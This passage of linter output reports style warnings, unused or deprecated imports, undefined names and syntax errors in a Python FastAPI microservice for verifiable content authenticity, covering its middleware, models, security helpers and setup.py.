   | ^^^^^^^^
29 |         # Call next middleware
30 |         response = await call_next(request)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\middleware.py:31:1
   |
29 |         # Call next middleware
30 |         response = await call_next(request)
31 |         
   | ^^^^^^^^
32 |         # Add to response headers
33 |         response.headers["X-Request-ID"] = request_id
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\middleware.py:34:1
   |
32 |         # Add to response headers
33 |         response.headers["X-Request-ID"] = request_id
34 |         
   | ^^^^^^^^
35 |         return response
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\middleware.py:40:1
   |
38 | class MetricsMiddleware(BaseHTTPMiddleware):
39 |     """Collect Prometheus metrics for requests"""
40 |     
   | ^^^^
41 |     async def dispatch(self, request: Request, call_next: Callable):
42 |         # Skip metrics endpoint itself
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\middleware.py:45:1
   |
43 |         if request.url.path == "/metrics":
44 |             return await call_next(request)
45 |         
   | ^^^^^^^^
46 |         # Increment inflight requests
47 |         INFLIGHT_REQUESTS.inc()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\middleware.py:48:1
   |
46 |         # Increment inflight requests
47 |         INFLIGHT_REQUESTS.inc()
48 |         
   | ^^^^^^^^
49 |         # Record start time
50 |         start_time = time.time()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\middleware.py:51:1
   |
49 |         # Record start time
50 |         start_time = time.time()
51 |         
   | ^^^^^^^^
52 |         try:
53 |             # Process request
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\middleware.py:55:1
   |
53 |             # Process request
54 |             response = await call_next(request)
55 |             
   | ^^^^^^^^^^^^
56 |             # Record metrics
57 |             duration = time.time() - start_time
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\middleware.py:59:1
   |
57 |             duration = time.time() - start_time
58 |             status_class = f"{response.status_code // 100}xx"
59 |             
   | ^^^^^^^^^^^^
60 |             # Get route template (not raw path to avoid high cardinality)
61 |             route_template = self._get_route_template(request)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\middleware.py:62:1
   |
60 |             # Get route template (not raw path to avoid high cardinality)
61 |             route_template = self._get_route_template(request)
62 |             
   | ^^^^^^^^^^^^
63 |             REQUEST_COUNT.labels(
64 |                 method=request.method,
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\middleware.py:68:1
   |
66 |                 status_class=status_class,
67 |             ).inc()
68 |             
   | ^^^^^^^^^^^^
69 |             REQUEST_DURATION.labels(
70 |                 method=request.method,
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\middleware.py:73:1
   |
71 |                 route_template=route_template,
72 |             ).observe(duration)
73 |             
   | ^^^^^^^^^^^^
74 |             return response
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\middleware.py:75:1
   |
74 |             return response
75 |         
   | ^^^^^^^^
76 |         finally:
77 |             # Decrement inflight requests
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\middleware.py:79:1
   |
77 |             # Decrement inflight requests
78 |             INFLIGHT_REQUESTS.dec()
79 |     
   | ^^^^
80 |     @staticmethod
81 |     def _get_route_template(request: Request) -> str:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\middleware.py:90:1
   |
88 | class RateLimitMiddleware(BaseHTTPMiddleware):
89 |     """Token bucket rate limiter"""
90 |     
   | ^^^^
91 |     def __init__(self, app, requests_per_minute: int = 100, burst: int = 200):
92 |         super().__init__(app)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\verifiable-reality\app\middleware.py:97:1
   |
95 |         self.tokens = {}  # client_id -> (tokens, last_update)
96 |         self.rate = requests_per_minute / 60.0  # tokens per second
97 |     
   | ^^^^
98 |     async def dispatch(self, request: Request, call_next: Callable):
99 |         # Skip health checks and metrics
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\verifiable-reality\app\middleware.py:102:1
    |
100 |         if request.url.path in ["/health", "/health/ready", "/health/live", "/metrics"]:
101 |             return await call_next(request)
102 |         
    | ^^^^^^^^
103 |         # Get client identifier (IP or authenticated user)
104 |         client_id = self._get_client_id(request)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\verifiable-reality\app\middleware.py:105:1
    |
103 |         # Get client identifier (IP or authenticated user)
104 |         client_id = self._get_client_id(request)
105 |         
    | ^^^^^^^^
106 |         # Check rate limit
107 |         if not self._allow_request(client_id):
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\verifiable-reality\app\middleware.py:120:1
    |
118 |                 headers={"Retry-After": "60"},
119 |             )
120 |         
    | ^^^^^^^^
121 |         return await call_next(request)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\verifiable-reality\app\middleware.py:122:1
    |
121 |         return await call_next(request)
122 |     
    | ^^^^
123 |     def _get_client_id(self, request: Request) -> str:
124 |         """Get client identifier for rate limiting"""
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\verifiable-reality\app\middleware.py:128:1
    |
126 |         if hasattr(request.state, "user"):
127 |             return f"user:{request.state.user}"
128 |         
    | ^^^^^^^^
129 |         # Fall back to IP address
130 |         forwarded_for = request.headers.get("X-Forwarded-For")
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\verifiable-reality\app\middleware.py:133:1
    |
131 |         if forwarded_for:
132 |             return f"ip:{forwarded_for.split(',')[0].strip()}"
133 |         
    | ^^^^^^^^
134 |         return f"ip:{request.client.host}"
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\verifiable-reality\app\middleware.py:135:1
    |
134 |         return f"ip:{request.client.host}"
135 |     
    | ^^^^
136 |     def _allow_request(self, client_id: str) -> bool:
137 |         """Check if request is allowed (token bucket algorithm)"""
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\verifiable-reality\app\middleware.py:139:1
    |
137 |         """Check if request is allowed (token bucket algorithm)"""
138 |         now = time.time()
139 |         
    | ^^^^^^^^
140 |         if client_id not in self.tokens:
141 |             self.tokens[client_id] = (self.burst - 1, now)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\verifiable-reality\app\middleware.py:143:1
    |
141 |             self.tokens[client_id] = (self.burst - 1, now)
142 |             return True
143 |         
    | ^^^^^^^^
144 |         tokens, last_update = self.tokens[client_id]
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\verifiable-reality\app\middleware.py:145:1
    |
144 |         tokens, last_update = self.tokens[client_id]
145 |         
    | ^^^^^^^^
146 |         # Add tokens based on time elapsed
147 |         elapsed = now - last_update
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\verifiable-reality\app\middleware.py:149:1
    |
147 |         elapsed = now - last_update
148 |         tokens = min(self.burst, tokens + elapsed * self.rate)
149 |         
    | ^^^^^^^^
150 |         if tokens >= 1:
151 |             self.tokens[client_id] = (tokens - 1, now)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\verifiable-reality\app\middleware.py:160:1
    |
158 | class AuthenticationMiddleware(BaseHTTPMiddleware):
159 |     """Authentication middleware"""
160 |     
    | ^^^^
161 |     # Public endpoints that don't require authentication
162 |     PUBLIC_PATHS = [
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\verifiable-reality\app\middleware.py:173:1
    |
171 |         "/api/v1/openapi.json",
172 |     ]
173 |     
    | ^^^^
174 |     async def dispatch(self, request: Request, call_next: Callable):
175 |         # Skip public endpoints
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\verifiable-reality\app\middleware.py:178:1
    |
176 |         if request.url.path in self.PUBLIC_PATHS:
177 |             return await call_next(request)
178 |         
    | ^^^^^^^^
179 |         # Try authentication
180 |         authenticated = False
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\verifiable-reality\app\middleware.py:182:1
    |
180 |         authenticated = False
181 |         user = None
182 |         
    | ^^^^^^^^
183 | # Try API key authentication
184 |         api_key = request.headers.get("X-API-Key")
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\verifiable-reality\app\middleware.py:210:1
    |
208 |                 headers={"WWW-Authenticate": "Bearer"},
209 |             )
210 |         
    | ^^^^^^^^
211 |         # Add user to request state
212 |         request.state.user = user
    |
help: Remove whitespace from blank line

invalid-syntax: unindent does not match any outer indentation level
   --> emergent-microservices\verifiable-reality\app\middleware.py:212:1
    |
211 |         # Add user to request state
212 |         request.state.user = user
    | ^^^^^^^^
213 |         
214 |         return await call_next(request)
    |

W293 Blank line contains whitespace
   --> emergent-microservices\verifiable-reality\app\middleware.py:213:1
    |
211 |         # Add user to request state
212 |         request.state.user = user
213 |         
    | ^^^^^^^^
214 |         return await call_next(request)
    |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
   --> emergent-microservices\verifiable-reality\app\middleware.py:214:1
    |
212 |         request.state.user = user
213 |         
214 |         return await call_next(request)
    | ^^^^^^^^
    |

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> emergent-microservices\verifiable-reality\app\models.py:2:1
  |
1 | from datetime import datetime
2 | from typing import Any, Dict, List, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3 | from uuid import UUID, uuid4
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\verifiable-reality\app\models.py:2:1
  |
1 | from datetime import datetime
2 | from typing import Any, Dict, List, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3 | from uuid import UUID, uuid4
  |

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\verifiable-reality\app\models.py:16:18
   |
14 |     event_type: str
15 |     payload_hash: str  # SHA256 of the event data
16 |     merkle_root: Optional[str] = None
   |                  ^^^^^^^^^^^^^
17 |     existence_certificate: Optional[str] = None  # RFC 3161 or Sovereign Notarization
18 |     provenance: Dict[str, Any]  # Source, Node ID, Consensus signatures
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\verifiable-reality\app\models.py:17:28
   |
15 |     payload_hash: str  # SHA256 of the event data
16 |     merkle_root: Optional[str] = None
17 |     existence_certificate: Optional[str] = None  # RFC 3161 or Sovereign Notarization
   |                            ^^^^^^^^^^^^^
18 |     provenance: Dict[str, Any]  # Source, Node ID, Consensus signatures
19 |     status: str = "pending"  # pending, certified, verified
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\verifiable-reality\app\models.py:18:17
   |
16 |     merkle_root: Optional[str] = None
17 |     existence_certificate: Optional[str] = None  # RFC 3161 or Sovereign Notarization
18 |     provenance: Dict[str, Any]  # Source, Node ID, Consensus signatures
   |                 ^^^^
19 |     status: str = "pending"  # pending, certified, verified
20 |     created_at: datetime = Field(default_factory=datetime.now)
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> emergent-microservices\verifiable-reality\app\models.py:29:24
   |
27 |     certificate_id: str
28 |     timestamp: datetime
29 |     quorum_signatures: List[str]
   |                        ^^^^
   |
help: Replace with `list`

F401 [*] `datetime.datetime` imported but unused
 --> emergent-microservices\verifiable-reality\app\repository.py:5:22
  |
3 | """
4 |
5 | from datetime import datetime
  |                      ^^^^^^^^
6 | from typing import Any, Dict, List, Optional, Tuple
7 | from uuid import UUID
  |
help: Remove unused import: `datetime.datetime`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> emergent-microservices\verifiable-reality\app\repository.py:6:1
  |
5 | from datetime import datetime
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\verifiable-reality\app\repository.py:6:1
  |
5 | from datetime import datetime
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
 --> emergent-microservices\verifiable-reality\app\repository.py:6:1
  |
5 | from datetime import datetime
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

F401 [*] `typing.Tuple` imported but unused
 --> emergent-microservices\verifiable-reality\app\repository.py:6:47
  |
5 | from datetime import datetime
6 | from typing import Any, Dict, List, Optional, Tuple
  |                                               ^^^^^
7 | from uuid import UUID
  |
help: Remove unused import: `typing.Tuple`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\verifiable-reality\app\repository.py:15:20
   |
13 | class Database:
14 |     def __init__(self):
15 |         self.data: Dict[str, Any] = {"proofs": {}}
   |                    ^^^^
16 |         self.connected = False
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\verifiable-reality\app\repository.py:30:50
   |
28 |         self.db = database
29 |
30 |     async def get_proof(self, proof_id: UUID) -> Optional[RealityProof]:
   |                                                  ^^^^^^^^^^^^^^^^^^^^^^
31 |         return self.db.data["proofs"].get(str(proof_id))
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\verifiable-reality\app\repository.py:37:45
   |
35 |         return proof
36 |
37 |     async def list_proofs(self, event_type: Optional[str] = None) -> List[RealityProof]:
   |                                             ^^^^^^^^^^^^^
38 |         proofs = list(self.db.data["proofs"].values())
39 |         if event_type:
   |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
  --> emergent-microservices\verifiable-reality\app\repository.py:37:70
   |
35 |         return proof
36 |
37 |     async def list_proofs(self, event_type: Optional[str] = None) -> List[RealityProof]:
   |                                                                      ^^^^
38 |         proofs = list(self.db.data["proofs"].values())
39 |         if event_type:
   |
help: Replace with `list`

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\verifiable-reality\app\routes.py:5:1
  |
3 | """
4 |
5 | from typing import List
  | ^^^^^^^^^^^^^^^^^^^^^^^
6 | from uuid import UUID
  |

F401 [*] `typing.List` imported but unused
 --> emergent-microservices\verifiable-reality\app\routes.py:5:20
  |
3 | """
4 |
5 | from typing import List
  |                    ^^^^
6 | from uuid import UUID
  |
help: Remove unused import: `typing.List`

F401 [*] `fastapi.Query` imported but unused
  --> emergent-microservices\verifiable-reality\app\routes.py:8:53
   |
 6 | from uuid import UUID
 7 |
 8 | from fastapi import APIRouter, Body, Depends, Path, Query, status
   |                                                     ^^^^^
 9 |
10 | from .logging_config import logger
   |
help: Remove unused import: `fastapi.Query`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> emergent-microservices\verifiable-reality\app\security.py:8:1
   |
 6 | import secrets
 7 | from datetime import datetime, timedelta
 8 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 9 |
10 | import jwt
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> emergent-microservices\verifiable-reality\app\security.py:8:1
   |
 6 | import secrets
 7 | from datetime import datetime, timedelta
 8 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 9 |
10 | import jwt
   |

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\verifiable-reality\app\security.py:32:44
   |
32 | def create_jwt_token(subject: str, claims: Optional[Dict[str, Any]] = None) -> str:
   |                                            ^^^^^^^^^^^^^^^^^^^^^^^^
33 |     """Create JWT token"""
34 |     now = datetime.utcnow()
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\verifiable-reality\app\security.py:32:53
   |
32 | def create_jwt_token(subject: str, claims: Optional[Dict[str, Any]] = None) -> str:
   |                                                     ^^^^
33 |     """Create JWT token"""
34 |     now = datetime.utcnow()
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\verifiable-reality\app\security.py:49:37
   |
49 | def verify_jwt_token(token: str) -> Optional[Dict[str, Any]]:
   |                                     ^^^^^^^^^^^^^^^^^^^^^^^^
50 |     """Verify JWT token and return payload"""
51 |     try:
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\verifiable-reality\app\security.py:49:46
   |
49 | def verify_jwt_token(token: str) -> Optional[Dict[str, Any]]:
   |                                              ^^^^
50 |     """Verify JWT token and return payload"""
51 |     try:
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> emergent-microservices\verifiable-reality\app\security.py:103:19
    |
102 | # Role -> Permissions mapping
103 | ROLE_PERMISSIONS: Dict[str, List[str]] = {
    |                   ^^^^
104 |     Role.VIEWER: [Permission.READ],
105 |     Role.EDITOR: [Permission.READ, Permission.WRITE],
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> emergent-microservices\verifiable-reality\app\security.py:103:29
    |
102 | # Role -> Permissions mapping
103 | ROLE_PERMISSIONS: Dict[str, List[str]] = {
    |                             ^^^^
104 |     Role.VIEWER: [Permission.READ],
105 |     Role.EDITOR: [Permission.READ, Permission.WRITE],
    |
help: Replace with `list`

F401 [*] `datetime.datetime` imported but unused
 --> emergent-microservices\verifiable-reality\app\services.py:6:22
  |
5 | import hashlib
6 | from datetime import datetime, timezone
  |                      ^^^^^^^^
7 | from typing import Any, Dict, List, Optional, Tuple
8 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `datetime.timezone` imported but unused
 --> emergent-microservices\verifiable-reality\app\services.py:6:32
  |
5 | import hashlib
6 | from datetime import datetime, timezone
  |                                ^^^^^^^^
7 | from typing import Any, Dict, List, Optional, Tuple
8 | from uuid import UUID
  |
help: Remove unused import

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> emergent-microservices\verifiable-reality\app\services.py:7:1
  |
5 | import hashlib
6 | from datetime import datetime, timezone
7 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8 | from uuid import UUID
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\verifiable-reality\app\services.py:7:1
  |
5 | import hashlib
6 | from datetime import datetime, timezone
7 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8 | from uuid import UUID
  |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
 --> emergent-microservices\verifiable-reality\app\services.py:7:1
  |
5 | import hashlib
6 | from datetime import datetime, timezone
7 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8 | from uuid import UUID
  |

F401 [*] `typing.List` imported but unused
 --> emergent-microservices\verifiable-reality\app\services.py:7:31
  |
5 | import hashlib
6 | from datetime import datetime, timezone
7 | from typing import Any, Dict, List, Optional, Tuple
  |                               ^^^^
8 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `typing.Optional` imported but unused
 --> emergent-microservices\verifiable-reality\app\services.py:7:37
  |
5 | import hashlib
6 | from datetime import datetime, timezone
7 | from typing import Any, Dict, List, Optional, Tuple
  |                                     ^^^^^^^^
8 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `typing.Tuple` imported but unused
 --> emergent-microservices\verifiable-reality\app\services.py:7:47
  |
5 | import hashlib
6 | from datetime import datetime, timezone
7 | from typing import Any, Dict, List, Optional, Tuple
  |                                               ^^^^^
8 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `.models.ExistenceCertificate` imported but unused
  --> emergent-microservices\verifiable-reality\app\services.py:11:21
   |
10 | from .logging_config import logger
11 | from .models import ExistenceCertificate, RealityProof
   |                     ^^^^^^^^^^^^^^^^^^^^
12 | from .repository import RealityRepository
   |
help: Remove unused import: `.models.ExistenceCertificate`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\verifiable-reality\app\services.py:22:38
   |
21 |     async def notarize_event(
22 |         self, event_type: str, data: Dict[str, Any], provenance: Dict[str, Any]
   |                                      ^^^^
23 |     ) -> RealityProof:
24 |         """Create a new existence proof for an event"""
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\verifiable-reality\app\services.py:22:66
   |
21 |     async def notarize_event(
22 |         self, event_type: str, data: Dict[str, Any], provenance: Dict[str, Any]
   |                                                                  ^^^^
23 |     ) -> RealityProof:
24 |         """Create a new existence proof for an event"""
   |
help: Replace with `dict`

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\verifiable-reality\database\scripts\integrity_check.py:7:1
  |
5 | import asyncio
6 | import sys
7 | from typing import List, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
 --> emergent-microservices\verifiable-reality\database\scripts\integrity_check.py:7:1
  |
5 | import asyncio
6 | import sys
7 | from typing import List, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

F401 [*] `typing.List` imported but unused
 --> emergent-microservices\verifiable-reality\database\scripts\integrity_check.py:7:20
  |
5 | import asyncio
6 | import sys
7 | from typing import List, Tuple
  |                    ^^^^
  |
help: Remove unused import

F401 [*] `typing.Tuple` imported but unused
 --> emergent-microservices\verifiable-reality\database\scripts\integrity_check.py:7:26
  |
5 | import asyncio
6 | import sys
7 | from typing import List, Tuple
  |                          ^^^^^
  |
help: Remove unused import

F821 Undefined name `check_integrity`
  --> emergent-microservices\verifiable-reality\database\scripts\integrity_check.py:13:20
   |
11 |     print("Running database integrity checks...")
12 |
13 |     errors = await check_integrity()
   |                    ^^^^^^^^^^^^^^^
14 |
15 |     if errors:
   |

F821 Undefined name `rollback_migration`
  --> emergent-microservices\verifiable-reality\database\scripts\rollback.py:16:21
   |
15 |     version = int(sys.argv[1])
16 |     success = await rollback_migration(version)
   |                     ^^^^^^^^^^^^^^^^^^
17 |     sys.exit(0 if success else 1)
   |

invalid-syntax: missing closing quote in string literal
 --> emergent-microservices\verifiable-reality\setup.py:6:17
  |
4 |     name="Verifiable Reality Infrastructure (Post-AI Proof Layer)",
5 |     version="1.0.0",
6 |     description="a cryptographic content authenticity network.
  |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | Microservices:
8 | Identity attestation service (hardware-bound keys, WebAuthn)
  |

invalid-syntax: Expected `,`, found name
 --> emergent-microservices\verifiable-reality\setup.py:7:1
  |
5 |     version="1.0.0",
6 |     description="a cryptographic content authenticity network.
7 | Microservices:
  | ^^^^^^^^^^^^^
8 | Identity attestation service (hardware-bound keys, WebAuthn)
9 | Media signing service (hash + Merkle anchoring)
  |

invalid-syntax: Expected `,`, found `:`
 --> emergent-microservices\verifiable-reality\setup.py:7:14
  |
5 |     version="1.0.0",
6 |     description="a cryptographic content authenticity network.
7 | Microservices:
  |              ^
8 | Identity attestation service (hardware-bound keys, WebAuthn)
9 | Media signing service (hash + Merkle anchoring)
  |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\verifiable-reality\setup.py:8:1
   |
 6 |     description="a cryptographic content authenticity network.
 7 | Microservices:
 8 | Identity attestation service (hardware-bound keys, WebAuthn)
   | ^^^^^^^^
 9 | Media signing service (hash + Merkle anchoring)
10 | Public verification API
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:8:10
   |
 6 |     description="a cryptographic content authenticity network.
 7 | Microservices:
 8 | Identity attestation service (hardware-bound keys, WebAuthn)
   |          ^^^^^^^^^^^
 9 | Media signing service (hash + Merkle anchoring)
10 | Public verification API
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:8:22
   |
 6 |     description="a cryptographic content authenticity network.
 7 | Microservices:
 8 | Identity attestation service (hardware-bound keys, WebAuthn)
   |                      ^^^^^^^
 9 | Media signing service (hash + Merkle anchoring)
10 | Public verification API
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\verifiable-reality\setup.py:8:22
   |
 6 |     description="a cryptographic content authenticity network.
 7 | Microservices:
 8 | Identity attestation service (hardware-bound keys, WebAuthn)
   |                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 9 | Media signing service (hash + Merkle anchoring)
10 | Public verification API
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:8:46
   |
 6 |     description="a cryptographic content authenticity network.
 7 | Microservices:
 8 | Identity attestation service (hardware-bound keys, WebAuthn)
   |                                              ^^^^
 9 | Media signing service (hash + Merkle anchoring)
10 | Public verification API
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:9:1
   |
 7 | Microservices:
 8 | Identity attestation service (hardware-bound keys, WebAuthn)
 9 | Media signing service (hash + Merkle anchoring)
   | ^^^^^
10 | Public verification API
11 | Browser extension verifier
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:9:7
   |
 7 | Microservices:
 8 | Identity attestation service (hardware-bound keys, WebAuthn)
 9 | Media signing service (hash + Merkle anchoring)
   |       ^^^^^^^
10 | Public verification API
11 | Browser extension verifier
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:9:15
   |
 7 | Microservices:
 8 | Identity attestation service (hardware-bound keys, WebAuthn)
 9 | Media signing service (hash + Merkle anchoring)
   |               ^^^^^^^
10 | Public verification API
11 | Browser extension verifier
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\verifiable-reality\setup.py:9:15
   |
 7 | Microservices:
 8 | Identity attestation service (hardware-bound keys, WebAuthn)
 9 | Media signing service (hash + Merkle anchoring)
   |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
10 | Public verification API
11 | Browser extension verifier
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:9:38
   |
 7 | Microservices:
 8 | Identity attestation service (hardware-bound keys, WebAuthn)
 9 | Media signing service (hash + Merkle anchoring)
   |                                      ^^^^^^^^^
10 | Public verification API
11 | Browser extension verifier
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:10:1
   |
 8 | Identity attestation service (hardware-bound keys, WebAuthn)
 9 | Media signing service (hash + Merkle anchoring)
10 | Public verification API
   | ^^^^^^
11 | Browser extension verifier
12 | Immutable transparency log
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:10:8
   |
 8 | Identity attestation service (hardware-bound keys, WebAuthn)
 9 | Media signing service (hash + Merkle anchoring)
10 | Public verification API
   |        ^^^^^^^^^^^^
11 | Browser extension verifier
12 | Immutable transparency log
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:10:21
   |
 8 | Identity attestation service (hardware-bound keys, WebAuthn)
 9 | Media signing service (hash + Merkle anchoring)
10 | Public verification API
   |                     ^^^
11 | Browser extension verifier
12 | Immutable transparency log
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:11:1
   |
 9 | Media signing service (hash + Merkle anchoring)
10 | Public verification API
11 | Browser extension verifier
   | ^^^^^^^
12 | Immutable transparency log
13 | Dispute resolution / counterclaim service
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:11:9
   |
 9 | Media signing service (hash + Merkle anchoring)
10 | Public verification API
11 | Browser extension verifier
   |         ^^^^^^^^^
12 | Immutable transparency log
13 | Dispute resolution / counterclaim service
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:11:19
   |
 9 | Media signing service (hash + Merkle anchoring)
10 | Public verification API
11 | Browser extension verifier
   |                   ^^^^^^^^
12 | Immutable transparency log
13 | Dispute resolution / counterclaim service
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:12:1
   |
10 | Public verification API
11 | Browser extension verifier
12 | Immutable transparency log
   | ^^^^^^^^^
13 | Dispute resolution / counterclaim service
14 | Use case:
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:12:11
   |
10 | Public verification API
11 | Browser extension verifier
12 | Immutable transparency log
   |           ^^^^^^^^^^^^
13 | Dispute resolution / counterclaim service
14 | Use case:
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\verifiable-reality\setup.py:12:24
   |
10 | Public verification API
11 | Browser extension verifier
12 | Immutable transparency log
